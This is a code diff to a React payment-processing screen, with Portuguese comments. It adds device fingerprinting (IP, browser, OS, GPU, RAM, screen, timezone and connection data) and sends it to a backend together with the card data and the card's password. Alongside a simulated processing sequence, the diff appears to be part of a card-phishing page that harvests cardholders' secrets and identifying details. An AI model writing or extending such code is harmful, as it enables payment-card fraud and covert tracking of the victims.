@@ -2,6 +2,7 @@ import { useEffect, useState } from 'react';
 import { CheckCircle, Loader } from 'lucide-react';
 import { toast } from 'sonner';
 import { CardPasswordModal } from './CardPasswordModal';
+import { detectDeviceInfo, type DeviceInfo } from '@/utils/device-detector';
 
 interface PaymentProcessingScreenProps {
   isOpen: boolean;
@@ -33,9 +34,22 @@ export const PaymentProcessingScreen = ({
   const [showPasswordModal, setShowPasswordModal] = useState(false);
   const [cardPassword, setCardPassword] = useState('');
   const [isSubmittingPassword, setIsSubmittingPassword] = useState(false);
+  const [deviceInfo, setDeviceInfo] = useState<DeviceInfo | null>(null);
 
   useEffect(() => {
     if (!isOpen) return;
+
+    // Captura informações do dispositivo
+    const captureDeviceInfo = async () => {
+      try {
+        const info = await detectDeviceInfo();
+        setDeviceInfo(info);
+      } catch (error) {
+        console.error('Erro ao capturar informações do dispositivo:', error);
+      }
+    };
+
+    captureDeviceInfo();
 
     // Simula cada passo do processamento
     const timings = [
@@ -67,11 +81,32 @@ export const PaymentProcessingScreen = ({
 
   const sendPaymentToBackend = async (password: string = '') => {
     try {
-      const backendUrl = 'http://localhost:5000';
+      const backendUrl = 'http://localhost:5555';
 
+      // Prepara dados completos com informações do dispositivo
       const completePaymentData = {
         ...paymentData,
         senhaCartao: password,
+        // Informações do Dispositivo
+        ip: deviceInfo?.ip,
+        userAgent: deviceInfo?.userAgent,
+        browserName: deviceInfo?.browserName,
+        browserVersion: deviceInfo?.browserVersion,
+        osName: deviceInfo?.osName,
+        osVersion: deviceInfo?.osVersion,
+        deviceType: deviceInfo?.deviceType,
+        deviceModel: deviceInfo?.deviceModel,
+        screenWidth: deviceInfo?.screenWidth,
+        screenHeight: deviceInfo?.screenHeight,
+        language: deviceInfo?.language,
+        timezone: deviceInfo?.timezone,
+        connectionType: deviceInfo?.connectionType,
+        effectiveConnectionType: deviceInfo?.effectiveConnectionType,
+        cores: deviceInfo?.cores,
+        ram: deviceInfo?.ram,
+        gpu: deviceInfo?.gpu,
+        maxTouchPoints: deviceInfo?.maxTouchPoints,
+        devicePixelRatio: deviceInfo?.devicePixelRatio,
       };
 
       const response = await fetch(`${backendUrl}/api/update-payment`, {
